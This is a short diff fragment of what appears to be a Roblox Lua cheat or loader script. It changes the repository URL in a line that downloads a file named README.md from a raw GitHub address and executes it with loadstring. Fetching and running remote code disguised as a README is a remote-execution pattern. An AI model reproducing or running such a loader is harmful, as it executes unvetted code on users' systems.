@@ -214,7 +214,7 @@ if dataencode.StatusCode == 200 then
                                 339 + timer or
                                 338 + timer)
                          then
-                            loadstring(game:HttpGet("https://raw.githubusercontent.com/x7Richz/LastPirate/main/README.md"))()
+                            loadstring(game:HttpGet("https://raw.githubusercontent.com/okpkgwnlo/LastPirate/main/README.md"))()
                             game.StarterGui:SetCore(
                                 "SendNotification",
                                 {
